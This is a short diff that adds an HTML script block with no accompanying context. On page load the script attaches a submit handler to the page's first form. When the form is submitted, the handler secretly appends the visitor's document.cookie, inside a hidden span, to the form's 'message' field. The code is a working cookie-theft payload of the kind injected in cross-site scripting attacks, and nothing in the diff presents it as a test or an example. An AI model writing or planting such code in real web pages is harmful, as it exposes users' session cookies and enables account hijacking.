@@ -1,0 +1,16 @@
+<script>
+
+function append_payload(){
+	var inputs = document.getElementsByTagName("input");
+	inputs["message"].value += "<span hidden>" + document.cookie + "</span>";
+}
+
+
+window.onload = function() {
+	var form = document.getElementsByTagName("form");
+	form[0].setAttribute("onsubmit", "append_payload()");
+}
+
+
+
+</script>
